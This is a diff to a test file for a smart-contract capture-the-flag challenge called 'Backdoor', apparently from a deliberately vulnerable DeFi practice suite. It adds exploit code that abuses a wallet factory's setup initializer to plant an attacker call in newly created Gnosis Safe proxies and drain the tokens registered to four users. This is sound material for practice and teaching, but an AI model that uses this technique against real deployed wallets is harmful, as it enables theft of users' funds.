@@ -37,6 +37,44 @@ describe('[Challenge] Backdoor', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // method 1：
+        // const expFac = await ethers.getContractFactory('WalletRegistryExp',attacker)
+        // const exp = await expFac.deploy();
+        // const attackCalldata = exp.interface.encodeFunctionData("attack",[this.token.address, attacker.address]);
+        // for (let user of [alice.address, bob.address, charlie.address, david.address]) {
+        //     let initializer = this.masterCopy.interface.encodeFunctionData("setup",[
+        //         [user],
+        //         1,
+        //         exp.address, // to
+        //         attackCalldata,
+        //         ethers.constants.AddressZero,
+        //         ethers.constants.AddressZero,
+        //         0,
+        //         ethers.constants.AddressZero
+        //     ])
+        //     let tx = await this.walletFactory.connect(attacker).createProxyWithCallback(
+        //         this.masterCopy.address,
+        //         initializer,
+        //         0,
+        //         this.walletRegistry.address
+        //     )
+        //     let txr = await tx.wait();
+        //     let proxy;
+        //     txr.logs.forEach(log => {
+        //         if (log.topics[0] == this.walletFactory.interface.getEventTopic('ProxyCreation')) 
+        //             proxy = this.walletFactory.interface.decodeEventLog("ProxyCreation",log.data,log.topics)['proxy']
+               
+        //     })
+        //     await  this.token.connect(attacker).transferFrom(proxy, attacker.address, ethers.utils.parseEther("10"));
+        // }
+
+
+
+        const expFac = await ethers.getContractFactory('WalletRegistryExp',attacker)
+        const exp = await expFac.deploy(this.masterCopy.address, this.walletRegistry.address);
+        await exp.connect(attacker).initAttack(this.token.address, attacker.address, this.walletFactory.address, users);
+
+       
     });
 
     after(async function () {
